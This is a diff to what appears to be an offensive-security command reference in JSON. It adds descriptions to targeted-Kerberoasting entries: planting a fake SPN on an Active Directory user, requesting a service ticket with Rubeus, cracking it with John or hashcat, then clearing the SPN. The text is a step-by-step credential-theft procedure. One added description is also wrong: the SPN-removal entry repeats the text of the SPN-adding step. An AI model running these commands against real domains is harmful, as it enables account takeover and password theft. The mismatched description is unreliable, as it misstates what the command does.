@@ -232,15 +232,18 @@
   "variations": [
     {
       "label": "Set SPN via AD Module",
-      "command": "Set-ADUser -Identity <user> -ServicePrincipalNames @{Add='nonexistent/BLAH'}"
+      "command": "Set-ADUser -Identity <user> -ServicePrincipalNames @{Add='nonexistent/BLAH'}",
+      "description": "Sets a Service Principal Name (SPN) on a target user account for targeted Kerberoasting. If you can write to the user object, add a fake SPN, request a service ticket, then crack it offline to get the password."
     },
     {
       "label": "Remove SPN via AD Module (cleanup)",
-      "command": "Set-ADUser -Identity <user> -ServicePrincipalNames @{Remove='nonexistent/BLAH'}"
+      "command": "Set-ADUser -Identity <user> -ServicePrincipalNames @{Remove='nonexistent/BLAH'}",
+      "description": "Sets a Service Principal Name (SPN) on a target user account for targeted Kerberoasting. If you can write to the user object, add a fake SPN, request a service ticket, then crack it offline to get the password."
     },
     {
       "label": "Crack the targeted hash (John)",
-      "command": "john.exe --wordlist=<wordlist> <hashfile>"
+      "command": "john.exe --wordlist=<wordlist> <hashfile>",
+      "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
     }
   ],
   "explain": "Makes an SPN-less user Kerberoastable by writing a fake SPN you can then roast:\n  Set-DomainObject -Identity <user>   the user you have GenericWrite/GenericAll over\n  -Set @{serviceprincipalname='nonexistent/BLAH'}   plant an arbitrary SPN\nWith an SPN present, Rubeus kerberoast /user:<user> returns a TGS hash; crack it (hashcat -m 13100), then clear the SPN (-Clear serviceprincipalname) to clean up."
